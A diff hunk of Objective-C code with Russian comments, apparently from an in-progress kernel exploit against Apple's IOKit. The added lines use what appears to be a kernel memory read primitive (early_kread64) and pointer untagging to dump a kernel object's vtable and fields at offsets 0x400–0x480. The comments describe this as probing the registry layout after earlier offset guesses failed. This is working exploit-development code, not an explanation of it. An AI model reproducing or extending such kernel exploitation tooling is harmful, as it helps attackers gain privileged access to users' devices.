@@ -5896,6 +5896,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
               (unsigned long long)surfVA, (unsigned long long)rangesVA]);
     kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)surfVA, (unsigned long long)rangesVA]);
+    if (!surfVA && rootVA) {
+        // 1.9.138: дамп окрестности rootVA — видим реальный layout реестра
+        // клиентов (count=0/arr=0 по оффсетам раунда 21 не сошлись)
+        uint64_t vt = early_kread64(rootVA);
+        kpNote(r, [NSString stringWithFormat:@"  rootVA vtable=%#llx (untag %#llx)",
+                  (unsigned long long)vt, (unsigned long long)kp_untag_ptr(vt)]);
+        for (uint64_t oo = 0x400; oo <= 0x480; oo += 8) {
+            uint64_t q = early_kread64(rootVA + oo);
+            kpNote(r, [NSString stringWithFormat:@"    root+%#03llx = %#018llx", oo, (unsigned long long)q]);
+        }
+    }
     if (!rangesVA) {
         // 1.9.130: ИЗМЕРЕНИЕ вместо тихого выхода — после execute сканируем
         // heap (тип 0x21) на ВСЕ формы backingPA и печатаем попадания с
